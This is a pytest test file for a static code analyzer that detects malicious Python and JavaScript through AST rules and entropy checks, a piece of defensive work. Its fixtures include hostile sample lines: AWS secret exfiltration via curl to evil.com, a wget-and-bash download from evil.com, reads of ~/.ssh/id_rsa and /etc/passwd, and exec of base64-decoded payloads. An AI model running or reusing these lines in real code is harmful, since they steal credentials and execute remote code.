"""
Unit tests for Module C: Static Code Analyzers (Python AST, JavaScript AST, Shannon Entropy).
"""

import os
import tempfile
import pytest

from engine.detection.static.python_ast import PythonASTAnalyzer
from engine.detection.static.javascript_ast import JavaScriptASTAnalyzer
from engine.detection.static.entropy import EntropyAnalyzer, calculate_shannon_entropy
from engine.schemas.finding import Severity


# ==============================================================================
# Python AST Tests
# ==============================================================================

def test_python_ast_dynamic_execution():
    analyzer = PythonASTAnalyzer()
    source = """
def run_payload(cmd):
    eval(cmd)
    exec("import os")
"""
    findings = analyzer.analyze_source(source, "payload.py")
    rule_ids = [f.rule_id for f in findings]
    assert "PY_DYNAMIC_EXECUTION" in rule_ids
    assert len([r for r in rule_ids if r == "PY_DYNAMIC_EXECUTION"]) == 2


def test_python_ast_subprocess_and_sensitive_env():
    analyzer = PythonASTAnalyzer()
    source = """
import os
import subprocess

def exfil():
    key = os.environ.get("AWS_SECRET_ACCESS_KEY")
    os.system("curl -d " + key + " http://evil.com")
    subprocess.Popen(["bash", "-c", "whoami"])
"""
    findings = analyzer.analyze_source(source, "exfil.py")
    rule_ids = [f.rule_id for f in findings]
    assert "PY_SUBPROCESS_SPAWN" in rule_ids
    assert "PY_SECRET_ENV_HARVESTING" in rule_ids


def test_python_ast_sensitive_file_targeting():
    analyzer = PythonASTAnalyzer()
    source = """
with open("~/.ssh/id_rsa", "r") as f:
    data = f.read()
"""
    findings = analyzer.analyze_source(source, "stealer.py")
    rule_ids = [f.rule_id for f in findings]
    assert "PY_SENSITIVE_FILE_TARGETING" in rule_ids


def test_python_ast_decoding_and_sockets():
    analyzer = PythonASTAnalyzer()
    source = """
import base64
import socket

raw = base64.b64decode("Y2FsYy5leGU=")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
"""
    findings = analyzer.analyze_source(source, "network.py")
    rule_ids = [f.rule_id for f in findings]
    assert "PY_PAYLOAD_DECODING" in rule_ids
    assert "PY_NETWORK_SOCKET_ACCESS" in rule_ids


def test_python_ast_syntax_error_handled_safely():
    analyzer = PythonASTAnalyzer()
    source = "def broken_syntax( { : invalid python code"
    # Must return empty list, not crash
    findings = analyzer.analyze_source(source, "broken.py")
    assert findings == []


# ==============================================================================
# JavaScript AST Tests
# ==============================================================================

def test_js_ast_dynamic_eval_and_function_constructor():
    analyzer = JavaScriptASTAnalyzer()
    source = """
eval("console.log('injected')");
const fn = new Function("a", "b", "return a + b;");
"""
    findings = analyzer.analyze_source(source, "index.js")
    rule_ids = [f.rule_id for f in findings]
    assert "JS_DYNAMIC_EVAL" in rule_ids
    assert "JS_FUNCTION_CONSTRUCTOR_EVAL" in rule_ids


def test_js_ast_child_process_and_buffer_decoding():
    analyzer = JavaScriptASTAnalyzer()
    source = """
const cp = require('child_process');
cp.exec("whoami");
const buf = Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64");
"""
    findings = analyzer.analyze_source(source, "worker.js")
    rule_ids = [f.rule_id for f in findings]
    assert "JS_CHILD_PROCESS_SPAWN" in rule_ids
    assert "JS_BASE64_BUFFER_DECODING" in rule_ids


def test_js_ast_raw_ip_and_sensitive_file():
    analyzer = JavaScriptASTAnalyzer()
    source = """
const fs = require('fs');
fs.readFileSync("/etc/passwd");
fetch("http://185.193.61.12:8080/stolen");
"""
    findings = analyzer.analyze_source(source, "exfil.js")
    rule_ids = [f.rule_id for f in findings]
    assert "JS_SENSITIVE_FILE_TARGETING" in rule_ids
    assert "JS_RAW_IP_ENDPOINT" in rule_ids


def test_js_package_json_install_hooks():
    analyzer = JavaScriptASTAnalyzer()
    pkg_json = {
        "name": "dangerous-pkg",
        "scripts": {
            "preinstall": "node setup.js",
            "test": "jest"
        }
    }
    findings = analyzer.analyze_package_json(pkg_json)
    assert len(findings) == 1
    assert findings[0].rule_id == "JS_LIFECYCLE_INSTALL_HOOK"
    assert findings[0].severity == Severity.MEDIUM


def test_js_ast_syntax_error_handled_safely():
    analyzer = JavaScriptASTAnalyzer()
    source = "const broken = {{{ invalid javascript ;;;;"
    findings = analyzer.analyze_source(source, "invalid.js")
    assert findings == []


# ==============================================================================
# Shannon Entropy Tests
# ==============================================================================

def test_calculate_shannon_entropy_math():
    # Identical bytes -> entropy 0
    assert calculate_shannon_entropy(b"AAAAAAA") == 0.0

    # Low entropy plain english
    plain = b"The quick brown fox jumps over the lazy dog."
    assert calculate_shannon_entropy(plain) < 4.5

    # High entropy pseudorandom bytes (near 8.0)
    high_entropy_bytes = bytes([i % 256 for i in range(10000)])
    assert calculate_shannon_entropy(high_entropy_bytes) > 7.5


def test_entropy_analyzer_detects_high_entropy_file():
    analyzer = EntropyAnalyzer()
    with tempfile.TemporaryDirectory() as tmp_dir:
        # Create high-entropy packed file (simulating encrypted blob)
        packed_file = os.path.join(tmp_dir, "packed.js")
        with open(packed_file, "wb") as f:
            f.write(bytes([i % 256 for i in range(4096)]))

        findings = analyzer.analyze_file(packed_file, "packed.js")
        assert len(findings) == 1
        assert findings[0].rule_id == "OBFUSCATION_HIGH_ENTROPY_FILE"
        assert findings[0].severity == Severity.MEDIUM


def test_entropy_analyzer_excludes_packaging_metadata_and_record():
    analyzer = EntropyAnalyzer()
    with tempfile.TemporaryDirectory() as tmp_dir:
        # 1. RECORD file in dist-info (high entropy sha256 hashes)
        record_dir = os.path.join(tmp_dir, "flask-3.1.3.dist-info")
        os.makedirs(record_dir)
        record_file = os.path.join(record_dir, "RECORD")
        with open(record_file, "w", encoding="utf-8") as f:
            for i in range(200):
                f.write(f"file_{i}.py,sha256=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=,1234\n")

        findings = analyzer.analyze_file(record_file, "flask-3.1.3.dist-info/RECORD")
        assert findings == []

        # 2. Package manifest package.json
        pkg_json = os.path.join(tmp_dir, "package.json")
        with open(pkg_json, "w", encoding="utf-8") as f:
            f.write('{"name": "test-pkg", "version": "1.0.0"}')
        findings_json = analyzer.analyze_file(pkg_json, "package.json")
        assert findings_json == []


def test_entropy_analyzer_detects_embedded_high_entropy_string():
    import base64
    analyzer = EntropyAnalyzer()
    with tempfile.TemporaryDirectory() as tmp_dir:
        code_file = os.path.join(tmp_dir, "stager.py")
        # Generate 140+ chars of real high-entropy base64 payload (entropy ~5.6 - 5.8)
        b64_payload = base64.b64encode(b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+~`|}{[]:;?><,./-=" * 2).decode()
        with open(code_file, "w", encoding="utf-8") as f:
            f.write(f'payload = "{b64_payload}"\nprint("running")\n')

        findings = analyzer.analyze_file(code_file, "stager.py")
        assert len(findings) == 1
        assert findings[0].rule_id == "OBFUSCATION_HIGH_ENTROPY_STRING"
        assert findings[0].severity == Severity.MEDIUM


# ==============================================================================
# Context-Aware False Positive Reduction Tests
# ==============================================================================

def test_python_ast_benign_config_loading_context():
    analyzer = PythonASTAnalyzer()
    # Flask-like configuration file execution
    source = """
def from_pyfile(filename):
    with open(filename, mode="rb") as config_file:
        exec(compile(config_file.read(), filename, "exec"), d.__dict__)
"""
    findings = analyzer.analyze_source(source, "flask/config.py")
    assert len(findings) == 1
    assert findings[0].rule_id == "PY_DYNAMIC_EXECUTION"
    assert findings[0].severity == Severity.LOW
    assert findings[0].confidence == 0.40
    assert findings[0].evidence.get("pattern") == "TRUSTED_CONFIG_OR_SHELL_EXECUTION"


def test_python_ast_benign_interactive_shell_context():
    analyzer = PythonASTAnalyzer()
    # Flask-like CLI shell startup execution
    source = """
def shell_command():
    eval(compile(f.read(), startup, "exec"), ctx)
"""
    findings = analyzer.analyze_source(source, "flask/cli.py")
    assert len(findings) == 1
    assert findings[0].rule_id == "PY_DYNAMIC_EXECUTION"
    assert findings[0].severity == Severity.LOW
    assert findings[0].confidence == 0.40
    assert findings[0].evidence.get("pattern") == "TRUSTED_CONFIG_OR_SHELL_EXECUTION"


def test_python_ast_benign_plugin_discovery_and_optional_import():
    analyzer = PythonASTAnalyzer()
    source = """
def find_package(import_name):
    root_mod = __import__(import_name)
    return root_mod

def optional_loader():
    try:
        importlib.import_module("optional_accel")
    except ImportError:
        pass
"""
    findings = analyzer.analyze_source(source, "flask/helpers.py")
    assert len(findings) == 2
    for f in findings:
        assert f.rule_id == "PY_DYNAMIC_IMPORT"
        assert f.severity == Severity.LOW
        assert f.confidence == 0.35
        assert f.evidence.get("pattern") == "PLUGIN_DISCOVERY_OR_HELPER"


def test_python_ast_malicious_obfuscated_dynamic_execution():
    analyzer = PythonASTAnalyzer()
    # Attacker executing base64-decoded payload
    source = """
import base64
def run_dropper(encoded):
    exec(base64.b64decode(encoded))
"""
    findings = analyzer.analyze_source(source, "dropper.py")
    obf_exec = [f for f in findings if f.rule_id == "PY_DYNAMIC_EXECUTION_OBFUSCATED"]
    assert len(obf_exec) == 1
    assert obf_exec[0].severity == Severity.CRITICAL
    assert obf_exec[0].confidence == 0.95


def test_python_ast_suspicious_dynamic_system_import():
    analyzer = PythonASTAnalyzer()
    # Dynamic import of subprocess or os to bypass static import checks
    source = """
def stealth_exec():
    sub = __import__("subprocess")
    sub.call(["id"])
"""
    findings = analyzer.analyze_source(source, "stealth.py")
    susp_import = [f for f in findings if f.rule_id == "PY_DYNAMIC_IMPORT_SUSPICIOUS"]
    assert len(susp_import) == 1
    assert susp_import[0].severity == Severity.MEDIUM
    assert susp_import[0].confidence == 0.80
    assert susp_import[0].evidence.get("module") == "subprocess"




# ==============================================================================
# Context-Aware Subprocess Regression Tests
# ==============================================================================

def test_subprocess_legitimate_production_code():
    analyzer = PythonASTAnalyzer()
    source = """
import subprocess
def get_locales():
    return subprocess.run(["locale", "-a"], capture_output=True, text=True)

def copy_clipboard(text):
    p = subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE)
    p.communicate(text.encode())
"""
    findings = analyzer.analyze_source(source, "pandas/_config/localization.py")
    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
    assert len(sub_findings) == 2
    for f in sub_findings:
        assert f.severity == Severity.LOW
        assert f.confidence == 0.40
        assert f.evidence.get("pattern") == "STANDARD_SYSTEM_PROCESS"
        assert f.evidence.get("shell") is False


def test_subprocess_legitimate_test_files():
    analyzer = PythonASTAnalyzer()
    source = """
import subprocess
import sys
def test_cli_execution():
    res = subprocess.check_call([sys.executable, "-m", "pytest"])
    out = subprocess.check_output(["git", "status"])
"""
    findings = analyzer.analyze_source(source, "pandas/tests/test_common.py")
    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
    assert len(sub_findings) == 2
    for f in sub_findings:
        assert f.severity == Severity.LOW
        assert f.confidence == 0.25
        assert f.evidence.get("pattern") == "TEST_OR_FIXTURE_PROCESS"
        assert f.evidence.get("is_test") is True


def test_subprocess_shell_true_with_suspicious_construction():
    analyzer = PythonASTAnalyzer()
    source = """
import subprocess
def install_hook(url):
    subprocess.Popen(f"curl -s {url} | bash", shell=True)
"""
    findings = analyzer.analyze_source(source, "installer.py")
    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
    assert len(sub_findings) == 1
    assert sub_findings[0].severity == Severity.HIGH
    assert sub_findings[0].confidence == 0.90
    assert sub_findings[0].evidence.get("pattern") == "SUSPICIOUS_COMMAND_SIGNATURE"


def test_subprocess_attacker_controlled_arguments():
    analyzer = PythonASTAnalyzer()
    source = """
import subprocess
def run_user_cmd(user_param):
    subprocess.run("echo " + user_param, shell=True)
"""
    findings = analyzer.analyze_source(source, "handler.py")
    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
    assert len(sub_findings) == 1
    assert sub_findings[0].severity == Severity.HIGH
    assert sub_findings[0].confidence == 0.85
    assert sub_findings[0].evidence.get("pattern") == "UNSAFE_DYNAMIC_SHELL"


def test_subprocess_obfuscated_command_execution():
    analyzer = PythonASTAnalyzer()
    source = """
import subprocess
import base64
def hidden_payload():
    subprocess.Popen(base64.b64decode("Y2FsYy5leGU="))
"""
    findings = analyzer.analyze_source(source, "stager.py")
    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
    assert len(sub_findings) == 1
    assert sub_findings[0].severity == Severity.CRITICAL
    assert sub_findings[0].confidence == 0.95
    assert sub_findings[0].evidence.get("pattern") == "OBFUSCATED_PAYLOAD"


def test_subprocess_download_and_execute_behavior():
    analyzer = PythonASTAnalyzer()
    source = """
import os
def download_stager():
    os.system("wget http://evil.com/payload.sh -O /tmp/p.sh && bash /tmp/p.sh")
"""
    findings = analyzer.analyze_source(source, "setup.py")
    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
    assert len(sub_findings) == 1
    assert sub_findings[0].severity == Severity.HIGH
    assert sub_findings[0].confidence == 0.90
    assert sub_findings[0].evidence.get("pattern") == "SUSPICIOUS_COMMAND_SIGNATURE"
